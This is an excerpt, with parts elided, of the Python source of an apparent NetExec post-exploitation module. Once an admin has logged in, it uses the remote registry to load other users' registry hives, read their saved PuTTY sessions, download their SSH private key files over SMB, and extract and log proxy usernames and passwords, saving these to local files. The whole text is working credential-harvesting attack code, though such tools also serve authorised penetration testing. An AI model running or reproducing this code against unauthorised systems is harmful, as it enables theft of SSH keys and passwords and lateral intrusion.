...
class NXCModule:
    ...
    def get_logged_on_users(self):
        ...
        key_handle = rrp.hBaseRegOpenKey(
            self.rrp._RemoteOperations__rrp, reg_handle, ""
        )["phkResult"]
        users = rrp.hBaseRegQueryInfoKey(self.rrp._RemoteOperations__rrp, key_handle)[
            "lpcSubKeys"
        ]

        # Get User Names
        user_objects = [
            rrp.hBaseRegEnumKey(self.rrp._RemoteOperations__rrp, key_handle, i)[
                "lpNameOut"
            ].split("\x00")[:-1][0]
    ...
    def get_all_users(self):
        ...
        key_handle = rrp.hBaseRegOpenKey(
            self.rrp._RemoteOperations__rrp,
            reg_handle,
    ...
    def sid_to_name(self, all_users):
        ...
        for user_object in all_users:
            key_handle = rrp.hBaseRegOpenKey(
                self.rrp._RemoteOperations__rrp,
                reg_handle,
                f"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\{user_object}",
            )["phkResult"]
            user_profile_path = rrp.hBaseRegQueryValue(
                self.rrp._RemoteOperations__rrp, key_handle, "ProfileImagePath"
            )[1].split("\x00")[:-1][0]
            rrp.hBaseRegCloseKey(self.rrp._RemoteOperations__rrp, key_handle)
    ...
    def load_missing_users(self, unloaded_user_objects):
        ...
        for user_object in unloaded_user_objects:
            try:
                ...
                reg_handle = rrp.hOpenLocalMachine(self.rrp._RemoteOperations__rrp)[
                    "phKey"
                ]
                key_handle = rrp.hBaseRegOpenKey(
                    self.rrp._RemoteOperations__rrp,
                ...
                rrp.hBaseRegLoadKey(
                    ...
                    key_handle,
                    user_object,
                    f"{user_profile_path}\\NTUSER.DAT",
                )
                rrp.hBaseRegCloseKey(self.rrp._RemoteOperations__rrp, key_handle)
            except rrp.DCERPCSessionError as e:
                self.context.log.fail(
                    f"Error loading user {user_object} into registry: {e}"
                )
    ...
    def unload_missing_users(self, unloaded_user_objects):
        ...
        for user_object in unloaded_user_objects:
            ...
            try:
                rrp.hBaseRegUnLoadKey(
                    self.rrp._RemoteOperations__rrp, key_handle, user_object
                )
            except rrp.DCERPCSessionError as e:
                self.context.log.fail(
                    f"Error unloading user {user_object} in registry: {e}"
                )
                self.context.log.debug(traceback.format_exc())
        rrp.hBaseRegCloseKey(self.rrp._RemoteOperations__rrp, key_handle)
        ...
        for user in all_users:
            try:
                key_handle = rrp.hBaseRegOpenKey(
                    self.rrp._RemoteOperations__rrp,
                    reg_handle,
                    f"{user}\\Software\\SimonTatham\\PuTTY\\Sessions",
                )["phkResult"]
                reg_sessions = rrp.hBaseRegQueryInfoKey(
                    self.rrp._RemoteOperations__rrp, key_handle
                )["lpcSubKeys"]
                self.context.log.info(
                    f'Found {reg_sessions} sessions for user "{self.user_dict[user]}" in registry!'
                )
                ...
                for session_name in session_names:
                    key_handle = rrp.hBaseRegOpenKey(
                        self.rrp._RemoteOperations__rrp,
                        reg_handle,
                        f"{user}\\Software\\SimonTatham\\PuTTY\\Sessions\\{session_name}",
                    )["phkResult"]

                    # Get private Key Path
                    private_key_path = rrp.hBaseRegQueryValue(
                        self.rrp._RemoteOperations__rrp, key_handle, "PublicKeyFile"
                    )[1].split("\x00")[:-1][0]
                    proxy_host = rrp.hBaseRegQueryValue(
                        self.rrp._RemoteOperations__rrp, key_handle, "ProxyHost"
                    )[1].split("\x00")[:-1][0]
                    proxy_port = rrp.hBaseRegQueryValue(
                        self.rrp._RemoteOperations__rrp, key_handle, "ProxyPort"
                    )[1]
                    proxy_username = rrp.hBaseRegQueryValue(
                        self.rrp._RemoteOperations__rrp, key_handle, "ProxyUsername"
                    )[1].split("\x00")[:-1][0]
                    proxy_password = rrp.hBaseRegQueryValue(
                        self.rrp._RemoteOperations__rrp, key_handle, "ProxyPassword"
                    )[1].split("\x00")[:-1][0]

                    # Session infos
                    hostname = rrp.hBaseRegQueryValue(
                        self.rrp._RemoteOperations__rrp, key_handle, "HostName"
                    )[1].split("\x00")[:-1][0]
                    port = rrp.hBaseRegQueryValue(
                        self.rrp._RemoteOperations__rrp, key_handle, "PortNumber"
                    )[1]
                    protocol = rrp.hBaseRegQueryValue(
                        self.rrp._RemoteOperations__rrp, key_handle, "Protocol"
                    )[1].split("\x00")[:-1][0]
                    sessions.append(
                        {
                ...
                if str(e).find("ERROR_FILE_NOT_FOUND"):
                    self.context.log.debug(
                        f"No PuTTY session config found in registry for user {self.user_dict[user]}"
                    )
                ...
                with open(download_path, "wb") as file:
                    try:
                        ...
                        if str(e).find("STATUS_OBJECT_NAME_NOT_FOUND") != -1:
                            self.context.log.fail(
                                f"Private key path found but file not found: {share + file_path}"
                            )
                        else:
                            self.context.log.exception(
                                f"Error downloading private key: {e}"
                            )
                        continue
                    file.write(buf.getvalue())
                self.context.log.success(
                    f"Private key found for user \"{session['user']}\", saved to {highlight(download_path)}"
                )
                self.context.log.highlight(f"Sessionname: {session['session_name']}")
                self.context.log.highlight(
                    f"Host: {session['hostname']}:{session['port']}"
                )
                self.context.log.highlight(f"Protocol: {session['protocol']}")
            if session["proxy_password"]:
                self.context.log.success(
                    f"Found proxy credentials for user \"{session['user']}\""
                )
                self.context.log.highlight(f"Sessionname: {session['session_name']}")
                self.context.log.highlight(
                    f"Host: {session['hostname']}:{session['port']}"
                ...
                self.context.log.highlight(f"Protocol: {session['protocol']}")
                self.context.log.highlight(
                    f"Proxy Host: {session['proxy_host']}:{session['proxy_port']}"
                )
                self.context.log.highlight(
                    f"Proxy Username: {session['proxy_username']}"
                )
                self.context.log.highlight(
                    f"Proxy Password: {session['proxy_password']}"
                )
                ...
                self.context.log.display(
                    f"Proxy credentials saved to {highlight(proxycreds_file)}"
                )
    ...
    def on_admin_login(self, context, connection):
        ...
        try:
            ...
            unloaded_user_objects = list(
                set(all_users).symmetric_difference(set(loaded_user_objects))
            )
